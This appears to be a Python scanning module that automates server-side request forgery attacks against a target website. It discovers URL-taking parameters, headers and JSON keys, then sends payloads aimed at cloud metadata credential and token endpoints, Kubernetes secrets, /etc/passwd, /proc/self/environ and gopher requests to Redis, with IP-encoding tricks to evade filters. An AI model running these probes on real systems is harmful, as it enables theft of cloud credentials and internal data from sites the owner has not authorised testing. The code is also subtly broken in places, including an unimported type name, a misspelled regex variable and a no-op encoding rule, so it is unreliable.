# utils/ssrf_prober.py
import asyncio
import aiohttp
import time
import re
import hashlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
from urllib.parse import (
    urlparse, urljoin, urlencode, parse_qs,
    urlunparse, quote, unquote
)


class SSRFVector(Enum):
    URL_PARAM = "url_parameter"
    PATH_PARAM = "path_parameter"
    HEADER_INJECTION = "header_injection"
    JSON_BODY = "json_body"
    FORM_BODY = "form_body"
    XML_BODY = "xml_body"
    REDIRECT_CHAIN = "redirect_chain"


class SSRFEvidence(Enum):
    OOB_DNS = "oob_dns_callback"
    OOB_HTTP = "oob_http_callback"
    ERROR_BASED = "error_based_disclosure"
    RESPONSE_DELTA = "response_content_difference"
    TIMING = "timing_based"
    BLIND = "blind_no_evidence"


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class SSRFPayload:
    name: str
    value: str
    target: str
    encoding: str = "none"
    notes: str = ""


@dataclass
class SSRFAttempt:
    vector: SSRFVector
    param_name: str
    payload: SSRFPayload
    endpoint: str
    method: str
    status_code: int
    response_length: int
    latency_ms: float
    response_snippet: str
    baseline_status: int
    baseline_length: int
    evidence: SSRFEvidence
    severity: Severity
    details: str
    fingerprint: str


@dataclass
class SSRFReport:
    target_url: str
    total_attempts: int
    findings: list[SSRFAttempt] = field(default_factory=list)
    findings_by_severity: dict[str, int] = field(default_factory=dict)
    params_discovered: list[str] = field(default_factory=list)
    headers_tested: list[str] = field(default_factory=list)
    duration_seconds: float = 0.0


METADATA_TARGETS = [
    ("aws_imds_v1",         "http://169.254.169.254/latest/meta-data/"),
    ("aws_imds_token",      "http://169.254.169.254/latest/api/token"),
    ("aws_imds_creds",      "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws_imds_userdata",   "http://169.254.169.254/latest/user-data/"),
    ("gcp_imds",            "http://metadata.google.internal/computeMetadata/v1/"),
    ("gcp_imds_token",      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("gcp_imds_hostname",   "http://metadata.google.internal/computeMetadata/v1/instance/hostname"),
    ("azure_imds",          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("azure_imds_token",    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ("digitalocean_imds",   "http://169.254.169.254/metadata/v1/"),
    ("alibaba_imds",        "http://100.100.100.200/latest/meta-data/"),
    ("oracle_imds",         "http://169.254.169.254/opc/v1/instance/"),
    ("kubernetes_api",      "https://kubernetes.default.svc/api/v1/"),
    ("kubernetes_secrets",  "https://kubernetes.default.svc/api/v1/secrets"),
    ("docker_api",          "http://localhost:2375/version"),
    ("docker_sock",         "http://localhost:2376/containers/json"),
    ("localhost_80",        "http://localhost/"),
    ("localhost_443",       "https://localhost/"),
    ("localhost_8080",      "http://localhost:8080/"),
    ("localhost_8443",      "https://localhost:8443/"),
    ("localhost_9200",      "http://localhost:9200/"),
    ("localhost_6379",      "http://localhost:6379/"),
    ("localhost_5432",      "http://localhost:5432/"),
    ("localhost_3306",      "http://localhost:3306/"),
    ("localhost_27017",     "http://localhost:27017/"),
    ("internal_10",         "http://10.0.0.1/"),
    ("internal_172",        "http://172.16.0.1/"),
    ("internal_192",        "http://192.168.1.1/"),
    ("file_etc_passwd",     "file:///etc/passwd"),
    ("file_etc_hosts",      "file:///etc/hosts"),
    ("file_proc_self",      "file:///proc/self/environ"),
    ("dict_localhost",      "dict://localhost:11211/"),
    ("gopher_redis",        "gopher://localhost:6379/_PING%0D%0A"),
    ("gopher_smtp",         "gopher://localhost:25/_HELO%20localhost"),
]

ENCODING_VARIANTS: list[tuple[str, callable]] = [
    ("raw",             lambda u: u),
    ("url_encoded",     lambda u: quote(u, safe="")),
    ("double_encoded",  lambda u: quote(quote(u, safe=""), safe="")),
    ("ip_decimal",      lambda u: _ip_to_decimal(u)),
    ("ip_octal",        lambda u: _ip_to_octal(u)),
    ("ip_hex",          lambda u: _ip_to_hex(u)),
    ("ip_mixed",        lambda u: _ip_mixed(u)),
    ("shorthand_127",   lambda u: u.replace("127.0.0.1", "127.1").replace("169.254.169.254", "169.254.169.254")),
    ("brackets_ipv6",   lambda u: u.replace("127.0.0.1", "[::1]").replace("localhost", "[::1]")),
    ("crlf_inject",     lambda u: u.rstrip("/") + "%0d%0aX-Injected: ssrf"),
]

SSRF_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Client-IP",
    "True-Client-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Referer",
    "X-Custom-IP-Authorization",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-ProxyUser-Ip",
    "Host",
]

URL_PARAM_NAMES = [
    "url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
    "redirect_url", "return", "return_url", "returnurl", "return_to",
    "next", "target", "source", "src", "callback", "callback_url",
    "continue", "goto", "link", "load", "page", "fetch", "open",
    "file", "document", "dir", "domain", "host", "proxy", "request",
    "image", "img", "thumb", "thumbnail", "preview", "data",
    "ref", "referrer", "site", "u", "q", "api", "endpoint",
    "webhook", "hook", "notify", "notification", "forward",
    "xml", "feed", "rss", "atom", "import", "export",
]

JSON_URL_KEYS = [
    "url", "uri", "href", "src", "source", "target", "endpoint",
    "callback", "webhook", "redirect", "returnUrl", "redirectUrl",
    "imageUrl", "avatarUrl", "profileUrl", "feedUrl", "apiUrl",
    "baseUrl", "hostUrl", "serviceUrl", "proxyUrl", "importUrl",
]

SSRF_INDICATOR_PATTERNS = [
    re.compile(r"(metadata|ami-id|instance-id|security-credentials)", re.I),
    re.compile(r"(root:[x*]:0:0|/bin/bash|/bin/sh)", re.I),
    re.compile(r"(127\.0\.0\.1|localhost|internal|intranet)", re.I),
    re.compile(r"(connection refused|connection reset|no route to host)", re.I),
    re.compile(r"(SSRF|server.side.request|internal.error|curl error)", re.I),
    re.compile(r"(redis_version|connected_slaves|used_memory)", re.I),
    re.compile(r"(postgres|mysql|mongodb|elasticsearch)", re.I),
    re.compile(r"(kubernetes|k8s|docker|container)", re.I),
    re.compile(r'"computeMetadata"|"iam"|"serviceAccounts"', re.I),
    re.compile(r"(PrivateDnsName|publicIpv4|mac.*[0-9a-f]{2}:)", re.I),
]

ERROR_PATTERNS = [
    re.compile(r"(invalid url|malformed url|url not allowed|blocked url)", re.I),
    re.compile(r"(could not connect|connection refused|network error|timeout)", re.I),
    re.compile(r"(scheme not supported|protocol not allowed|unsafe url)", re.I),
    re.compile(r"(java\.net\.|curl_exec|file_get_contents|urllib|requests\.get)", re.I),
]


def _ip_to_decimal(url: str) -> str:
    def _conv(m):
        parts = m.group(0).split(".")
        if len(parts) != 4:
            return m.group(0)
        try:
            return str(
                (int(parts[0]) << 24) |
                (int(parts[1]) << 16) |
                (int(parts[2]) << 8) |
                int(parts[3])
            )
        except ValueError:
            return m.group(0)
    return re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", _conv, url)
    
    
def _ip_to_octal(url: str) -> str:
    def _conv(m):
        parts = m.group(0).split(".")
        if len(parts) != 4:
            return m.group(0)
        try:
            return ".".join(oct(int(p))[2:] for p in parts)
        except ValueError:
            return m.group(0)
    return re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", _conv, url)


def _ip_to_hex(url: str) -> str:
    def _conv(m):
        parts = m.group(0).split(".")
        if len(parts) != 4:
            return m.group(0)
        try:
            return "0x" + "".join(f"{int(p):02x}" for p in parts)
        except ValueError:
            return m.group(0)
    return re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", _conv, url)


def _ip_mixed(url: str) -> str:
    def _conv(m):
        parts = m.group(0).split(".")
        if len(parts) != 4:
            return m.group(0)
        try:
            return f"{parts[0]}.{int(parts[1]):03o}.0x{int(parts[2]):02x}.{parts[3]}"
        except ValueError:
            return m.group(0)
    return re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", _conv, url)


def _hash(text: str) -> str:
    return hashlib.md5(text.encode()).hexdigest()[:12]


def _body_snippet(body: bytes, limit: int = 300) -> str:
    return body[:limit].decode("utf-8", errors="ignore").replace("\n", " ").strip()


def _detect_evidence(
    status: int,
    body: bytes,
    latency_ms: float,
    baseline_status: int,
    baseline_length: int,
    baseline_latency: float,
) -> tuple[SSRFEvidence, Severity, str]:
    text = body.decode("utf-8", errors="ignore")
    body_len = len(body)

    for pat in SSRF_INDICATOR_PATTERNS:
        if pat.search(text):
            return (
                SSRFEvidence.ERROR_BASED,
                Severity.CRITICAL,
                f"SSRF indicator in response body: '{pat.pattern[:60]}'"
            )

    if status == 200 and baseline_status != 200:
        return (
            SSRFEvidence.RESPONSE_DELTA,
            Severity.HIGH,
            f"Status changed from {baseline_status} to 200 with SSRF payload"
        )

    length_delta = abs(body_len - baseline_length)
    if length_delta > 500 and status == baseline_status:
        return (
            SSRFEvidence.RESPONSE_DELTA,
            Severity.MEDIUM,
            f"Response length delta {length_delta} bytes — possible internal content leak"
        )

    if latency_ms > baseline_latency * 2.5 and latency_ms > 3000:
        return (
            SSRFEvidence.TIMING,
            Severity.MEDIUM,
            f"Response latency {latency_ms:.0f}ms vs baseline {baseline_latency:.0f}ms — possible internal connection attempt"
        )

    for pat in ERROR_PATTERNS:
        if pat.search(text):
            return (
                SSRFEvidence.ERROR_BASED,
                Severity.LOW,
                f"Error pattern suggests URL fetch attempt: '{pat.pattern[:60]}'"
            )

    return (
        SSRFEvidence.BLIND,
        Severity.INFO,
        "No direct evidence — blind SSRF possible, verify with OOB callback"
    )
    
    
def _extract_url_params(html: str, page_url: str) -> List[tuple[str, str]]:
    found: set[tuple[str, str]] = set()
    parsed = urlparse(page_url)
    
    qs = parse_qs(parsed.query)
    for key in qs:
        if any(hint in key.lower() for hint in URL_PARAM_NAMES):
            found.add((key, page_url))
            
    form_action_re = re.compile(
        r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>',
        re.DOTALL | re.IGNORECASE
    )
    input_re = re.compile(
        r'<input[^>]+name=["\']([^"\']+)["\']', re.I
    )
    for fm in form_action_fe.finditer(html):
        action = fm.group(1).strip() or page_url
        full_action = urljoin(page_url, action)
        for inp in input_re.finditer(fm.group(2)):
            name = inp.group(1).strip()
            if any(hint in name.lower() for hint in URL_PARAM_NAMES):
                found.add((name, full_action))
                
    link_re = re.compile(r'href=["\']([^"\']+)["\']', re.I)
    for m in link_re.finditer(html):
        href = m.group(1)
        full = urljoin(page_url, href)
        pq = parse_qs(urlparse(full).query)
        for key in pq:
            if any(hint in key.lower() for hint in URL_PARAM_NAMES):
                found.add((key, full))
                
    for name in URL_PARAM_NAMES:
        if re.search(rf'["\']({re.escape(name)})["\']', html, re.I):
            found.add((name, page_url))
            
    return list(found)
    
    
def _build_payloads_for_target(target_url: str, target_name: str) -> list[SSRFPayload]:
    payloads: list[SSRFPayload] = []
    for enc_name, enc_fn in ENCODING_VARIANTS:
        try:
            encoded = enc_fn(target_url)
        except Exception:
            encoded = target_url
        if encoded == target_url and enc_name != "raw":
            continue
        payloads.append(SSRFPayload(
            name=f"{target_name}_{enc_name}",
            value=encoded,
            target=target_url,
            encoding=enc_name,
            notes=f"{target_name} via {enc_name}",
        ))
    return payloads
    
    
async def _fetch_page(
    session: aiohttp.ClientSession,
    url: str,
    headers: dict,
    semaphore: asyncio.Semaphore,
) -> tuple[int, str, dict, float]:
    async with semaphore:
        t0 = time.monotonic()
        try:
            async with session.get(
                url, headers=headers,
                allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=12),
                ssl=False,
            ) as resp:
                body = await resp.read()
                return (
                    resp.status,
                    body.decode("utf-8", errors="ignore"),
                    dict(resp.headers),
                    (time.monotonic() - t0) * 1000,
                )
        except Exception:
            return 0, "", {}, (time.monotonic() - t0) * 1000


async def _probe_url_param(
    session: aiohttp.ClientSession,
    endpoint: str,
    param: str,
    payload: SSRFPayload,
    method: str,
    base_headers: dict,
    baseline_status: int,
    baseline_length: int,
    baseline_latency: float,
    semaphore: asyncio.Semaphore,
    delay: float,
) -> SSRFAttempt:
    async with semaphore:
        if delay > 0:
            await asyncio.sleep(delay)

        parsed = urlparse(endpoint)
        qs = parse_qs(parsed.query)
        qs[param] = [payload.value]
        new_query = urlencode({k: v[0] for k, v in qs.items()})
        probe_url = urlunparse(parsed._replace(query=new_query))

        t0 = time.monotonic()
        try:
            async with session.request(
                method, probe_url,
                headers=base_headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=12),
                ssl=False,
            ) as resp:
                body = await resp.read()
                latency = (time.monotonic() - t0) * 1000
                status = resp.status
        except asyncio.TimeoutError:
            latency = (time.monotonic() - t0) * 1000
            evidence, severity, details = SSRFEvidence.TIMING, Severity.MEDIUM, f"Timeout on SSRF probe — possible internal connection hang"
            return SSRFAttempt(
                vector=SSRFVector.URL_PARAM, param_name=param,
                payload=payload, endpoint=endpoint, method=method,
                status_code=0, response_length=0, latency_ms=latency,
                response_snippet="TIMEOUT", baseline_status=baseline_status,
                baseline_length=baseline_length, evidence=evidence,
                severity=severity, details=details,
                fingerprint=_hash(f"{endpoint}:{param}:{payload.name}"),
            )
        except Exception as e:
            return SSRFAttempt(
                vector=SSRFVector.URL_PARAM, param_name=param,
                payload=payload, endpoint=endpoint, method=method,
                status_code=-1, response_length=0, latency_ms=0,
                response_snippet=str(e)[:150], baseline_status=baseline_status,
                baseline_length=baseline_length, evidence=SSRFEvidence.BLIND,
                severity=Severity.INFO, details="Request error",
                fingerprint=_hash(f"{endpoint}:{param}:{payload.name}"),
            )

        evidence, severity, details = _detect_evidence(
            status, body, latency,
            baseline_status, baseline_length, baseline_latency
        )
        return SSRFAttempt(
            vector=SSRFVector.URL_PARAM, param_name=param,
            payload=payload, endpoint=endpoint, method=method,
            status_code=status, response_length=len(body),
            latency_ms=round(latency, 2),
            response_snippet=_body_snippet(body),
            baseline_status=baseline_status, baseline_length=baseline_length,
            evidence=evidence, severity=severity, details=details,
            fingerprint=_hash(f"{endpoint}:{param}:{payload.name}"),
        )


async def _probe_header(
    session: aiohttp.ClientSession,
    endpoint: str,
    header_name: str,
    payload: SSRFPayload,
    base_headers: dict,
    baseline_status: int,
    baseline_length: int,
    baseline_latency: float,
    semaphore: asyncio.Semaphore,
    delay: float,
) -> SSRFAttempt:
    async with semaphore:
        if delay > 0:
            await asyncio.sleep(delay)
        headers = {**base_headers, header_name: payload.value}
        t0 = time.monotonic()
        try:
            async with session.get(
                endpoint, headers=headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=12),
                ssl=False,
            ) as resp:
                body = await resp.read()
                latency = (time.monotonic() - t0) * 1000
                status = resp.status
        except asyncio.TimeoutError:
            latency = (time.monotonic() - t0) * 1000
            return SSRFAttempt(
                vector=SSRFVector.HEADER_INJECTION, param_name=header_name,
                payload=payload, endpoint=endpoint, method="GET",
                status_code=0, response_length=0, latency_ms=latency,
                response_snippet="TIMEOUT",
                baseline_status=baseline_status, baseline_length=baseline_length,
                evidence=SSRFEvidence.TIMING, severity=Severity.MEDIUM,
                details="Timeout on header SSRF probe",
                fingerprint=_hash(f"hdr:{endpoint}:{header_name}:{payload.name}"),
            )
        except Exception as e:
            return SSRFAttempt(
                vector=SSRFVector.HEADER_INJECTION, param_name=header_name,
                payload=payload, endpoint=endpoint, method="GET",
                status_code=-1, response_length=0, latency_ms=0,
                response_snippet=str(e)[:150],
                baseline_status=baseline_status, baseline_length=baseline_length,
                evidence=SSRFEvidence.BLIND, severity=Severity.INFO,
                details="Request error",
                fingerprint=_hash(f"hdr:{endpoint}:{header_name}:{payload.name}"),
            )

        evidence, severity, details = _detect_evidence(
            status, body, latency,
            baseline_status, baseline_length, baseline_latency
        )
        return SSRFAttempt(
            vector=SSRFVector.HEADER_INJECTION, param_name=header_name,
            payload=payload, endpoint=endpoint, method="GET",
            status_code=status, response_length=len(body),
            latency_ms=round(latency, 2),
            response_snippet=_body_snippet(body),
            baseline_status=baseline_status, baseline_length=baseline_length,
            evidence=evidence, severity=severity, details=details,
            fingerprint=_hash(f"hdr:{endpoint}:{header_name}:{payload.name}"),
        )
        
        
async def _probe_json_body(
    session: aiohttp.ClientSession,
    endpoint: str,
    key: str,
    payload: SSRFPayload,
    base_headers: dict,
    baseline_status: int,
    baseline_length: int,
    baseline_latency: float,
    semaphore: asyncio.Semaphore,
    delay: float,
) -> SSRFAttempt:
    import json as _json
    async with semaphore:
        if delay > 0:
            await asyncio.sleep(delay)
        headers = {**base_headers, "Content-Type": "application/json"}
        body_data = _json.dumps({key: payload.value})
        t0 = time.monotonic()
        try:
            async with session.post(
                endpoint, headers=headers, data=body_data,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=12),
                ssl=False,
            ) as resp:
                body = await resp.read()
                latency = (time.monotonic() - t0) * 1000
                status = resp.status
        except asyncio.TimeoutError:
            latency = (time.monotonic() - t0) * 1000
            return SSRFAttempt(
                vector=SSRFVector.JSON_BODY, param_name=key,
                payload=payload, endpoint=endpoint, method="POST",
                status_code=0, response_length=0, latency_ms=latency,
                response_snippet="TIMEOUT",
                baseline_status=baseline_status, baseline_length=baseline_length,
                evidence=SSRFEvidence.TIMING, severity=Severity.MEDIUM,
                details="Timeout on JSON SSRF probe",
                fingerprint=_hash(f"json:{endpoint}:{key}:{payload.name}"),
            )
        except Exception as e:
            return SSRFAttempt(
                vector=SSRFVector.JSON_BODY, param_name=key,
                payload=payload, endpoint=endpoint, method="POST",
                status_code=-1, response_length=0, latency_ms=0,
                response_snippet=str(e)[:150],
                baseline_status=baseline_status, baseline_length=baseline_length,
                evidence=SSRFEvidence.BLIND, severity=Severity.INFO,
                details="Request error",
                fingerprint=_hash(f"json:{endpoint}:{key}:{payload.name}"),
            )

        evidence, severity, details = _detect_evidence(
            status, body, latency,
            baseline_status, baseline_length, baseline_latency
        )
        return SSRFAttempt(
            vector=SSRFVector.JSON_BODY, param_name=key,
            payload=payload, endpoint=endpoint, method="POST",
            status_code=status, response_length=len(body),
            latency_ms=round(latency, 2),
            response_snippet=_body_snippet(body),
            baseline_status=baseline_status, baseline_length=baseline_length,
            evidence=evidence, severity=severity, details=details,
            fingerprint=_hash(f"json:{endpoint}:{key}:{payload.name}"),
        )


class SSRFProber:
    def __init__(
        self,
        concurrency: int = 8,
        delay: float = 0.15,
        max_params: int = 20,
        max_payloads_per_param: int = 6,
        test_headers: bool = True,
        test_json: bool = True,
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    ):
        self.concurrency = concurrency
        self.delay = delay
        self.max_params = max_params
        self.max_payloads_per_param = max_payloads_per_param
        self.test_headers = test_headers
        self.test_json = test_json
        self.base_headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
        }

    def _select_payloads(self, limit: int) -> list[SSRFPayload]:
        priority_targets = [
            "aws_imds_v1", "aws_imds_creds",
            "gcp_imds", "azure_imds",
            "kubernetes_api", "localhost_80",
            "file_etc_passwd", "localhost_6379",
        ]
        priority_encodings = ["raw", "url_encoded", "ip_decimal", "ip_octal"]

        result: list[SSRFPayload] = []
        for target_name, target_url in METADATA_TARGETS:
            if target_name not in priority_targets:
                continue
            for enc_name, enc_fn in ENCODING_VARIANTS:
                if enc_name not in priority_encodings:
                    continue
                try:
                    encoded = enc_fn(target_url)
                except Exception:
                    encoded = target_url
                result.append(SSRFPayload(
                    name=f"{target_name}_{enc_name}",
                    value=encoded,
                    target=target_url,
                    encoding=enc_name,
                ))
                if len(result) >= limit:
                    return result
        return result[:limit]

    async def run(self, target_url: str) -> SSRFReport:
        t_start = time.monotonic()
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)
        semaphore = asyncio.Semaphore(self.concurrency)

        async with aiohttp.ClientSession(connector=connector) as session:
            baseline_status, baseline_html, _, baseline_latency = await _fetch_page(
                session, target_url, self.base_headers, semaphore
            )
            baseline_length = len(baseline_html.encode("utf-8", errors="ignore"))

            discovered_params = _extract_url_params(baseline_html, target_url)
            discovered_params = discovered_params[:self.max_params]

            param_names_only = list({p for p, _ in discovered_params})
            for name in URL_PARAM_NAMES:
                if name not in param_names_only and len(param_names_only) < self.max_params:
                    param_names_only.append(name)

            payloads = self._select_payloads(self.max_payloads_per_param)

            all_attempts: list[SSRFAttempt] = []
            seen_fps: set[str] = set()

            param_tasks = []
            for param_name in param_names_only[:self.max_params]:
                for payload in payloads:
                    param_tasks.append(_probe_url_param(
                        session, target_url, param_name, payload,
                        "GET", self.base_headers,
                        baseline_status, baseline_length, baseline_latency,
                        semaphore, self.delay,
                    ))

            param_results = await asyncio.gather(*param_tasks)
            for r in param_results:
                if r.fingerprint not in seen_fps:
                    seen_fps.add(r.fingerprint)
                    all_attempts.append(r)

            if self.test_headers:
                ssrf_header_payloads = [
                    SSRFPayload("imds_raw", "http://169.254.169.254/", "aws_imds_v1"),
                    SSRFPayload("localhost_raw", "http://localhost/", "localhost"),
                    SSRFPayload("internal_raw", "http://internal/", "internal"),
                ]
                header_tasks = []
                for header in SSRF_HEADERS:
                    for payload in ssrf_header_payloads:
                        header_tasks.append(_probe_header(
                            session, target_url, header, payload,
                            self.base_headers,
                            baseline_status, baseline_length, baseline_latency,
                            semaphore, self.delay,
                        ))
                header_results = await asyncio.gather(*header_tasks)
                for r in header_results:
                    if r.fingerprint not in seen_fps:
                        seen_fps.add(r.fingerprint)
                        all_attempts.append(r)

            if self.test_json:
                json_payloads = [
                    SSRFPayload("imds_raw", "http://169.254.169.254/latest/meta-data/", "aws_imds_v1"),
                    SSRFPayload("localhost_raw", "http://localhost/", "localhost"),
                ]
                json_tasks = []
                for key in JSON_URL_KEYS[:8]:
                    for payload in json_payloads:
                        json_tasks.append(_probe_json_body(
                            session, target_url, key, payload,
                            self.base_headers,
                            baseline_status, baseline_length, baseline_latency,
                            semaphore, self.delay,
                        ))
                json_results = await asyncio.gather(*json_tasks)
                for r in json_results:
                    if r.fingerprint not in seen_fps:
                        seen_fps.add(r.fingerprint)
                        all_attempts.append(r)

        findings = [
            a for a in all_attempts
            if a.severity in (Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW)
            and a.evidence != SSRFEvidence.BLIND
        ]
        findings.sort(key=lambda x: list(Severity).index(x.severity))

        severity_count = {s.value: 0 for s in Severity}
        for f in findings:
            severity_count[f.severity.value] += 1

        return SSRFReport(
            target_url=target_url,
            total_attempts=len(all_attempts),
            findings=findings,
            findings_by_severity=severity_count,
            params_discovered=param_names_only,
            headers_tested=SSRF_HEADERS if self.test_headers else [],
            duration_seconds=time.monotonic() - t_start,
        )

    def run_sync(self, target_url: str) -> SSRFReport:
        return asyncio.run(self.run(target_url))


def serialize_report(report: SSRFReport) -> dict:
    def attempt_to_dict(a: SSRFAttempt) -> dict:
        return {
            "vector": a.vector.value,
            "param": a.param_name,
            "payload_name": a.payload.name,
            "payload_value": a.payload.value,
            "payload_target": a.payload.target,
            "encoding": a.payload.encoding,
            "endpoint": a.endpoint,
            "method": a.method,
            "status": a.status_code,
            "response_length": a.response_length,
            "latency_ms": a.latency_ms,
            "baseline_status": a.baseline_status,
            "baseline_length": a.baseline_length,
            "evidence": a.evidence.value,
            "severity": a.severity.value,
            "details": a.details,
            "snippet": a.response_snippet,
        }

    return {
        "target": report.target_url,
        "total_attempts": report.total_attempts,
        "total_findings": len(report.findings),
        "duration_seconds": round(report.duration_seconds, 2),
        "findings_by_severity": report.findings_by_severity,
        "params_discovered": report.params_discovered,
        "headers_tested": report.headers_tested,
        "findings": [attempt_to_dict(f) for f in report.findings],
    }


def run_ssrf_probe(
    target_url: str,
    concurrency: int = 8,
    delay: float = 0.15,
    max_params: int = 20,
    test_headers: bool = True,
    test_json: bool = True,
) -> dict:
    prober = SSRFProber(
        concurrency=concurrency,
        delay=delay,
        max_params=max_params,
        test_headers=test_headers,
        test_json=test_json,
    )
    report = prober.run_sync(target_url)
    return serialize_report(report)